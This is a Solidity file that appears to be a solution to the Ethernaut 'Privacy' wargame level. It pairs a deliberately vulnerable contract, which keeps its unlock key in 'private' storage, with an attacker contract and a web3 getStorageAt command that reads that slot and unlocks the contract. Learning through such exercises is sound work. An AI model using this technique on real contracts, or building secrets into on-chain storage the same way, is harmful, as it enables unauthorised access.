pragma solidity ^0.6.0;

/* 
Privacy
Level completed!
Difficulty 8/10

The creator of this contract was careful enough to protect the sensitive areas of its storage.

Unlock this contract to beat the level.

Things that might help:

Understanding how storage works
Understanding how parameter parsing works
Understanding how casting works
Tips:

Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.
Nothing in the ethereum blockchain is private. The keyword private is merely an artificial construct of the Solidity language. Web3's getStorageAt(...) can be used to read anything from storage. It can be tricky to read what you want though, since several optimization rules and techniques are used to compact the storage as much as possible.

It can't get much more complicated than what was exposed in this level. For more, check out this excellent article by "Darius": How to read Ethereum contract storage: https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925

Sources
 */


/*
Nothing is private on the blockchain:

1. Get the data from the slot number:
Ethereum stores data contguously in 32bytes. so, keeping values that
can fit int contguous 32bytes can save space
await web3.eth.getStorageAt(contract.address, 5, (e, v) => console.log(v));
*/

contract AttactPrivacy {
  Privacy target;
  
  
  constructor(address _targetAddress) public {
      target = Privacy(_targetAddress);
  }
  
  function unlock(bytes32 _slotValue) public {
      // cast bytes32 gotten from the slot valuue to bytes32. This splits it in half. i.e the last half
      bytes16 key = bytes16(_slotValue);
      target.unlock(key);
  }
    
}
// 0xb7067f69858ec900efac5e20e91ee5b8a73220f921987c52c7ab842e775f9f0c

// SPDX-License-Identifier: MIT
// pragma solidity ^0.6.0;


// 8bits = 1byte
contract Privacy {
  // 1byte... Total=1byte...fits in slot 0
  bool public locked = true;
  // 256bits = 32bytes... Total=32byte...fits in slot 1. Can't fit anymore in slot 0
  uint256 public ID = block.timestamp;
  // 8bits = 1byte... Total+= 1 byte = 1...fits in slot 2
  uint8 private flattening = 10;
  // 8bits = 1byte... Total+= 1 byte = 2...fits in slot 2
  uint8 private denomination = 255;
  // 16bits = 2bytes... Total+= 2 bytes = 4bytes(less than 32 bytes)...fits in slot 2
  uint16 private awkwardness = uint16(now);
  // 32*3 bytes... Total=1byte...fits in slot 3,4,5 (therefore data[2] is slot 5). None can fit in slot 2 anymore cos it will then be more than 32bytes
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    // data[2] is slot 5
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
